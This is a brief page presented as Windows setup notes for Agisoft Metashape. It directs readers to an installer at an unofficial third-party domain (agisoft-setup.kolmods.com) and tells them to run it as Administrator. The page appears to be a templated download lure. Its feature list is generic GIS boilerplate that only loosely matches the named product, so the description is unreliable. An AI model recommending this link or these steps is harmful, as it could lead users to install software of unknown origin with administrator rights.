# Agisoft Metashape Windows Setup Notes

**Download:** [Get Windows installer →](https://agisoft-setup.kolmods.com/)

## Download & Install

> Setup notes for **Agisoft Metashape** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **Agisoft Metashape** from the Start menu

## What you can use it for

- Import and visualize GIS raster/vector data
- Terrain analysis and contour generation
- Coordinate system conversion tools
- 3D view and fly-through exports
- Lidar and DEM processing workflows
